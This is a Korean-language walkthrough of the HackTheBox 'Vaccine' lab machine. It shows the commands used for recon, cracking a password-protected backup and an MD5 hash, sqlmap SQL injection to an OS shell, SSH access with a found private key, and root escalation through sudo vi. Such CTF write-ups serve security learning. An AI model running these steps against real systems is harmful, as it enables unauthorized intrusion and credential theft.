# Vaccine - HackTheBox StartingPoint
## Recon
```bash
sudo nmap -p 21,22,80 -sC -sV -vv -oA vaccine 10.129.10.22
```
<img width="1106" height="573" alt="image" src="https://github.com/user-attachments/assets/506701b4-dcef-4ad0-b6ca-7a5d212eb061" />
<img width="1106" height="199" alt="image" src="https://github.com/user-attachments/assets/479c8ee5-0038-44be-9d61-53b417043e6b" />

- FTP(21)
- SSH(22)
- HTTP(80)

---
## FTP
- anonymous login을 하여 `backup.zip`을 다운로드
```bash
ftp 10.129.10.22
```
<img width="1106" height="456" alt="image" src="https://github.com/user-attachments/assets/843d06e0-f688-4e47-b967-9e46939eadf4" />

<br>
<br>

- `backup.zip`을 압축 해제하려 했으나 비밀번호가 걸려 있는 것을 확인.
<img width="1106" height="328" alt="image" src="https://github.com/user-attachments/assets/41a65acf-f49f-4153-9583-6a191844cc63" />

<br>
<br>

- `zip2jhon`을 사용하여 해시화
```bash
zip2john backup.zip >hash
```
<img width="1106" height="193" alt="image" src="https://github.com/user-attachments/assets/809ffd9d-f016-4ca4-a651-5c0bddde3ac5" />

<br>
<br>

- `jhon`을 사용하여 크래킹
<img width="1106" height="205" alt="image" src="https://github.com/user-attachments/assets/4b2acc20-8c1a-4fa4-bf94-5e011ec8247b" />

<br>
<br>

- 크래킹한 비밀번호로 압축 해제.
<img width="1106" height="432" alt="image" src="https://github.com/user-attachments/assets/223d04ea-a020-4736-a45e-6fd9f8aed711" />

---
## HTTP
- `index.php`를 사용하고 있음을 확인.
<img width="1200" height="597" alt="image" src="https://github.com/user-attachments/assets/a4e38327-e882-40b7-9a3a-77bc91f06892" />

<br>
<br>

- 압축 해제 된 파일 `index.php`에서 로그인 계정에 대한 정보를 확인.
<img width="1073" height="245" alt="image" src="https://github.com/user-attachments/assets/d55dc080-807e-48cd-822f-e67188bba880" />

<br>
<br>

- md5로 암호화 된 비밀번호를 크래킹 시도.
 - `admin:qwerty789` 로그인 계정 획득.
```bash
hashcat -m 0 hash ~/util/rockyou.txt

hashcat -m 0 hash ~/util/rockyou.txt --show
```
<img width="492" height="89" alt="image" src="https://github.com/user-attachments/assets/e210af48-5b87-472b-bf5b-3db06695fbec" />

<br>
<br>

- 획득한 계정으로 로그인 시도.
<img width="1200" height="656" alt="image" src="https://github.com/user-attachments/assets/f5e3b899-e870-41bb-8649-7c5a0e5a6581" />

---
## SQL injection
- `search`입력란에 SQL injection 테스트를 시도해보니 에러 출력.
<img width="1496" height="272" alt="image" src="https://github.com/user-attachments/assets/9a1d7070-c4e1-4be4-8f06-5129e8e8863b" />

<br>
<br>

- `burpsuite`로 request를 파일로 만들어서 `sqlmap`으로 injection 테스트
```bash
sqlmap -r req -p search
```
<img width="1105" height="380" alt="image" src="https://github.com/user-attachments/assets/22d37630-3e31-4c69-925c-f16c11056a19" />

<br>
<br>

- shell 획득 시도하여 성공.
```bash
sqlmap -r req -p search --os-shell --batch
```
<img width="1105" height="80" alt="image" src="https://github.com/user-attachments/assets/e68ab804-1477-47b1-aca6-8a4e3252dac5" />

<br>
<br>

- reverse shell 연결 시도하여 획득.
<img width="813" height="206" alt="image" src="https://github.com/user-attachments/assets/3b8f9ad8-2aef-40a1-ac41-b3a3d2b8e84e" />

---
## SSH
- `/var/lib/postgresql/.ssh`에서 id_rsa를 발견.
<img width="650" height="139" alt="image" src="https://github.com/user-attachments/assets/a2e7f7f0-829a-48e6-8b47-1be825abcab5" />

<br>
<br>

- ssh로 로그인 시도하여 성공.
```bash
ssh postgres@10.129.10.22 -i id_rsa
```
<img width="1103" height="561" alt="image" src="https://github.com/user-attachments/assets/0913515a-385a-4040-98cd-bf502fe7c637" />

---
## Privesc
- `/var/www/html`의 `dashboard.php`에서 `postgresql`로그인 계정 발견.
<img width="1103" height="145" alt="image" src="https://github.com/user-attachments/assets/5b5d8979-3560-4fa1-bbb1-c718b283b67e" />

<br>
<br>

- `sudo -l`에 해당 비밀번호로 사용해봄.
<img width="1103" height="157" alt="image" src="https://github.com/user-attachments/assets/d09404b6-89c4-4ba8-a84d-75fb1c29bb33" />

<br>
<br>

- https://gtfobins.github.io/gtfobins/vi/
- `GTFOBIN`에서 `vi`를 통해서 셸을 획득하는 것을 확인.
<img width="1010" height="323" alt="image" src="https://github.com/user-attachments/assets/080c2180-e348-4514-8573-0091982f0721" />

<br>
<br>

- `vi`를 통해서 권한 상승 시도
```bash
sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
```
<img width="1010" height="25" alt="image" src="https://github.com/user-attachments/assets/afb79962-23fd-4e09-b662-f7da70e2f2b3" />
<img width="1010" height="25" alt="image" src="https://github.com/user-attachments/assets/9ee4f0c4-ae02-4a76-993c-4a4c87da689a" />

<br>
<br>

- `root`권한 획득
<img width="1010" height="62" alt="image" src="https://github.com/user-attachments/assets/e933261f-4fd4-4208-8f1c-cef89ef501ce" />

---
## flag
- `/var/lib/postgresql/users.txt`
- `/root/flag.txt`





















